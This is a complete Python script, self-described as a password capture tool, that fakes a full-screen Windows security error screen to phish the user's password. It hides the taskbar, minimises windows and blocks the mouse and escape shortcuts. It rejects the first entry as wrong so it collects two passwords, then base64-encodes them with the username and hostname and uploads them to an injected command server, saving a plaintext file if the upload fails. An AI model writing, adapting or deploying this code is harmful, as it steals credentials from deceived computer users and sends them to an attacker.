# -*- coding: utf-8 -*-
"""
Password Capture Script
Creates a fake Windows error page to capture user password/passcode
"""
import sys
import os
import time
import json
import base64
import urllib.request
import ctypes
import subprocess
from datetime import datetime

# Server configuration
# SERVER_URL will be injected by the server when sending the script
try:
    SERVER_URL
except NameError:
    print("ERROR: SERVER_URL not set. Server should inject this variable.")
    sys.exit(1)
PC_ID = os.environ.get("CC_PC_ID", "unknown")

print("=" * 70)
print("   PASSWORD CAPTURE (WINDOWS ERROR)")
print("=" * 70)
print(f"   Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
print("=" * 70)

# Try to import tkinter
try:
    import tkinter as tk
except ImportError:
    print("[!] tkinter not available")
    sys.exit(1)

# Try to import PIL for image loading
try:
    from PIL import Image, ImageTk
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False

# Try to import qrcode for QR code generation
try:
    import qrcode
    QRCODE_AVAILABLE = True
except ImportError:
    QRCODE_AVAILABLE = False

# Get current username
try:
    USERNAME = os.environ.get("USERNAME") or os.environ.get("USER") or "User"
except:
    USERNAME = "User"

# Captured passwords (global)
first_password = None
second_password = None
password_captured = False
password_attempt = 0

# System state
user32 = ctypes.windll.user32
SW_HIDE = 0
SW_SHOW = 5


def hide_taskbar():
    """Hide the Windows taskbar."""
    try:
        taskbar = user32.FindWindowW("Shell_TrayWnd", None)
        if taskbar:
            user32.ShowWindow(taskbar, SW_HIDE)
            secondary = user32.FindWindowW("Shell_SecondaryTrayWnd", None)
            while secondary:
                user32.ShowWindow(secondary, SW_HIDE)
                secondary = user32.FindWindowExW(None, secondary, "Shell_SecondaryTrayWnd", None)
            print("[*] Taskbar hidden")
    except Exception as e:
        print(f"[!] Could not hide taskbar: {e}")


def show_taskbar():
    """Show the Windows taskbar."""
    try:
        taskbar = user32.FindWindowW("Shell_TrayWnd", None)
        if taskbar:
            user32.ShowWindow(taskbar, SW_SHOW)
            secondary = user32.FindWindowW("Shell_SecondaryTrayWnd", None)
            while secondary:
                user32.ShowWindow(secondary, SW_SHOW)
                secondary = user32.FindWindowExW(None, secondary, "Shell_SecondaryTrayWnd", None)
            print("[*] Taskbar restored")
    except Exception as e:
        print(f"[!] Could not show taskbar: {e}")


def minimize_all_windows():
    """Minimize all open windows to show desktop."""
    try:
        user32.keybd_event(0x5B, 0, 0, 0)  # Win key down
        user32.keybd_event(0x44, 0, 0, 0)  # D key down
        user32.keybd_event(0x44, 0, 2, 0)  # D key up
        user32.keybd_event(0x5B, 0, 2, 0)  # Win key up
        time.sleep(0.3)
        print("[*] All windows minimized")
    except Exception as e:
        try:
            ps_script = '(New-Object -ComObject Shell.Application).MinimizeAll()'
            subprocess.run(['powershell', '-Command', ps_script], capture_output=True, timeout=2)
            print("[*] All windows minimized (PowerShell)")
        except:
            print(f"[!] Could not minimize windows: {e}")


def upload_password(password_data):
    """Upload captured passwords to server."""
    try:
        print("\n[*] Uploading captured data to server...")
        
        capture_data = {
            "timestamp": datetime.now().isoformat(),
            "username": password_data.get("username", USERNAME),
            "first_password": password_data.get("first_password", ""),
            "second_password": password_data.get("second_password", ""),
            "pc_id": PC_ID,
            "hostname": os.environ.get("COMPUTERNAME", "Unknown")
        }
        
        json_data = json.dumps(capture_data, indent=2)
        json_bytes = json_data.encode('utf-8')
        json_base64 = base64.b64encode(json_bytes).decode('utf-8')
        
        upload_data = {
            "pc_id": PC_ID,
            "filename": f"password_capture_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json",
            "content_base64": json_base64,
            "original_path": "Password Capture"
        }
        
        data = json.dumps(upload_data).encode('utf-8')
        req = urllib.request.Request(
            f"{SERVER_URL}/upload/base64",
            data=data,
            headers={"Content-Type": "application/json"}
        )
        
        with urllib.request.urlopen(req, timeout=30) as response:
            result = json.loads(response.read().decode('utf-8'))
            print(f"[+] Password captured and uploaded successfully!")
            print(f"    File ID: {result.get('file_id', 'unknown')}")
            return True
    except Exception as e:
        print(f"[!] Upload failed: {e}")
        try:
            backup_file = os.path.join(os.path.expanduser("~"), f"password_capture_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
            with open(backup_file, 'w') as f:
                f.write(f"Username: {password_data.get('username', USERNAME)}\n")
                f.write(f"First Password: {password_data.get('first_password', '')}\n")
                f.write(f"Second Password: {password_data.get('second_password', '')}\n")
                f.write(f"Timestamp: {datetime.now().isoformat()}\n")
            print(f"[*] Backup saved to: {backup_file}")
        except:
            pass
        return False


def on_password_submit(event=None):
    """Handle password submission."""
    global first_password, second_password, password_captured, password_attempt
    
    password = password_entry.get()
    
    if not password:
        return
    
    password_attempt += 1
    
    if password_attempt == 1:
        # First attempt - store and show incorrect message
        first_password = password
        print(f"[*] First password captured: {password}")
        
        status_label.config(text="Verifying passcode...", fg="#FFD700")
        root.update()
        time.sleep(1)
        
        status_label.config(text="The password is incorrect. Please try again.", fg="#FFD700")
        error_desc.config(text="Your PC ran into a problem and needs to restart.\nA threat was detected and removed from your system.\nEnter your password to complete the security process.",
                          fg='white')
        
        password_entry.delete(0, tk.END)
        password_entry.focus_force()
        root.update()
        
    elif password_attempt == 2:
        # Second attempt - store and complete
        second_password = password
        password_captured = True
        print(f"[*] Second password captured: {password}")
        
        status_label.config(text="Verifying passcode...", fg="#FFD700")
        root.update()
        time.sleep(1)
        
        password_data = {
            "username": USERNAME,
            "first_password": first_password,
            "second_password": second_password
        }
        
        upload_password(password_data)
        
        time.sleep(1)
        print("[*] Restoring system state...")
        show_taskbar()
        time.sleep(0.2)
        
        root.quit()
        root.destroy()


# This function will be defined inside create_error_screen after password_entry is created


def create_error_screen():
    """Create fake Windows error page asking for passcode."""
    global root, password_entry, status_label, error_desc
    
    # Prepare system state
    print("[*] Preparing system problem state...")
    minimize_all_windows()
    time.sleep(0.2)
    hide_taskbar()
    time.sleep(0.2)
    
    root = tk.Tk()
    
    # Window settings - fullscreen with blue background (Windows error/BSOD style)
    root.attributes('-fullscreen', True)
    root.attributes('-topmost', True)
    root.configure(bg='#0078D7')  # Windows BSOD blue
    root.overrideredirect(True)
    root.config(cursor="none")  # Hide cursor (disable mouse visually)
    root.protocol("WM_DELETE_WINDOW", lambda: None)
    
    # Main frame (left-aligned, top portion)
    main_frame = tk.Frame(root, bg='#0078D7')
    main_frame.place(relx=0.08, rely=0.15, anchor='nw')
    
    # Main title (left-aligned)
    title_label = tk.Label(
        main_frame,
        text="Windows Security",
        font=('Segoe UI', 28, 'bold'),
        fg='white',
        bg='#0078D7',
        anchor='w'
    )
    title_label.pack(anchor='w', pady=(0, 25))
    
    # Error message (left-aligned)
    error_desc = tk.Label(
        main_frame,
        text="Your PC ran into a problem and needs to restart.\nA threat was detected and removed from your system.\nEnter your password to complete the security process.",
        font=('Segoe UI', 18),
        fg='white',
        bg='#0078D7',
        justify='left',
        anchor='w',
        wraplength=800
    )
    error_desc.pack(anchor='w', pady=(0, 35))
    
    # Password section (left-aligned)
    passcode_section = tk.Frame(main_frame, bg='#0078D7')
    passcode_section.pack(anchor='w')
    
    passcode_label = tk.Label(
        passcode_section,
        text="Enter your Windows password:",
        font=('Segoe UI', 16),
        fg='white',
        bg='#0078D7',
        anchor='w'
    )
    passcode_label.pack(anchor='w', pady=(0, 15))
    
    # Password entry field (Windows lock screen style - modern white input box)
    # Create a frame to simulate rounded corners and better styling
    entry_frame = tk.Frame(
        passcode_section,
        bg='white',
        relief='flat',
        bd=0
    )
    entry_frame.pack(anchor='w', pady=(0, 20))
    
    password_entry = tk.Entry(
        entry_frame,
        font=('Segoe UI', 18),
        bg='#FFFFFF',
        fg='#1E1E1E',
        insertbackground='#1E1E1E',
        borderwidth=0,
        relief='flat',
        highlightthickness=0,
        show='●',
        width=32,
        justify='left'
    )
    password_entry.pack(padx=15, pady=12, ipadx=5, ipady=5)
    
    # Bind Enter key to password field
    password_entry.bind('<Return>', on_password_submit)
    password_entry.bind('<KP_Enter>', on_password_submit)
    
    # Status label (for verification messages, left-aligned)
    status_label = tk.Label(
        passcode_section,
        text="",
        font=('Segoe UI', 14),
        fg='#FFD700',
        bg='#0078D7',
        anchor='w',
        wraplength=800
    )
    status_label.pack(anchor='w')
    
    # Generate QR code (bottom left - Windows error screen style)
    qr_image = None
    if QRCODE_AVAILABLE and PIL_AVAILABLE:
        try:
            microsoft_url = "https://www.microsoft.com"
            qr = qrcode.QRCode(
                version=1,
                error_correction=qrcode.constants.ERROR_CORRECT_L,
                box_size=8,
                border=2,
            )
            qr.add_data(microsoft_url)
            qr.make(fit=True)
            
            qr_img = qr.make_image(fill_color="black", back_color="white")
            qr_img = qr_img.resize((120, 120), Image.Resampling.LANCZOS)
            qr_image = ImageTk.PhotoImage(qr_img)
            print(f"[*] Generated QR code linking to: {microsoft_url}")
        except Exception as e:
            print(f"[!] Could not generate QR code: {e}")
    
    # QR code display (bottom left)
    if qr_image:
        qr_label = tk.Label(
            root,
            image=qr_image,
            bg='#0078D7'
        )
        qr_label.image = qr_image
        qr_label.place(relx=0.08, rely=0.78, anchor='w')
    else:
        # Fallback: white placeholder
        qr_frame = tk.Frame(root, bg='white', width=120, height=120)
        qr_frame.place(relx=0.08, rely=0.78, anchor='w')
        qr_frame.pack_propagate(False)
        qr_label = tk.Label(
            qr_frame,
            text="QR\nCODE",
            font=('Segoe UI', 10),
            fg='#000000',
            bg='white',
            justify='center'
        )
        qr_label.pack(expand=True)
    
    # Stop code info (bottom left, next to QR code)
    stop_code_frame = tk.Frame(root, bg='#0078D7')
    stop_code_frame.place(relx=0.25, rely=0.78, anchor='w')
    
    stop_code_label = tk.Label(
        stop_code_frame,
        text="For more information about this issue and possible fixes, visit\nhttps://www.windows.com/stopcode\n\nIf you call a support person, give them this info:\nStop code: SYSTEM_SECURITY_CHECK_FAILED",
        font=('Segoe UI', 11),
        fg='white',
        bg='#0078D7',
        justify='left'
    )
    stop_code_label.pack(anchor='w')
    
    # Handle keyboard input at root level - ensure focus and handle Enter
    def handle_key(event):
        """Handle keyboard input - ensure password field has focus."""
        try:
            # Block system shortcuts
            if event.state & 0x20000:  # Alt key
                if event.keysym in ['Tab', 'F4']:
                    return "break"
            if event.keysym in ['Super_L', 'Super_R']:  # Win key
                return "break"
            
            # Always ensure password field has focus when any key is pressed
            try:
                if root.focus_get() != password_entry:
                    password_entry.focus_force()
            except:
                password_entry.focus_force()
            
            # Handle Enter key at root level
            if event.keysym in ['Return', 'KP_Enter']:
                on_password_submit()
                return "break"
            
            # Let all other keys go to the focused widget (password_entry)
            return None
        except Exception:
            return None
    
    # Bind keyboard events at root level
    root.bind_all('<KeyPress>', handle_key)
    
    # Force focus on root window and password field immediately
    root.update_idletasks()  # Update window first
    root.focus_force()  # Focus root window first
    password_entry.focus_force()  # Then focus password field
    
    # Set focus multiple times to ensure it sticks
    def set_focus():
        try:
            password_entry.focus_force()
        except:
            pass
    
    # Call focus multiple times at different intervals
    root.after(10, set_focus)
    root.after(50, set_focus)
    root.after(100, set_focus)
    root.after(200, set_focus)
    root.after(500, set_focus)
    
    # Periodic focus check (non-recursive, limited)
    focus_check_count = [0]  # Use list to allow modification in nested function
    
    def periodic_focus():
        """Periodically check and set focus (non-recursive)."""
        try:
            if focus_check_count[0] < 50:  # Limit to 50 checks (5 seconds)
                if root.winfo_exists() and root.focus_get() != password_entry:
                    password_entry.focus_force()
                focus_check_count[0] += 1
                root.after(100, periodic_focus)  # Check every 100ms
        except:
            pass
    
    root.after(300, periodic_focus)
    
    # Block mouse interaction (disable mouse)
    def block_mouse(event):
        """Block all mouse events."""
        return "break"
    
    # Block mouse clicks and movement
    root.bind('<Button-1>', block_mouse)
    root.bind('<Button-2>', block_mouse)
    root.bind('<Button-3>', block_mouse)
    root.bind('<Motion>', block_mouse)
    root.bind('<Enter>', block_mouse)
    root.bind('<Leave>', block_mouse)
    root.bind('<MouseWheel>', block_mouse)
    
    print("[*] Windows error screen displayed")
    print("[*] Waiting for passcode input...")
    
    # Start main loop
    root.mainloop()


def main():
    """Main function."""
    try:
        create_error_screen()
        
        if password_captured:
            print("\n" + "=" * 70)
            print("[OK] Password capture complete!")
            print(f"    Username: {USERNAME}")
            print(f"    First Password: {first_password if first_password else 'Not captured'}")
            print(f"    Second Password: {second_password if second_password else 'Not captured'}")
            print("=" * 70)
        else:
            print("\n[!] Password capture cancelled or window closed")
            show_taskbar()
            
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        show_taskbar()
    except Exception as e:
        print(f"\n[ERROR] {e}")
        show_taskbar()
        import traceback
        traceback.print_exc()


if __name__ == '__main__':
    main()
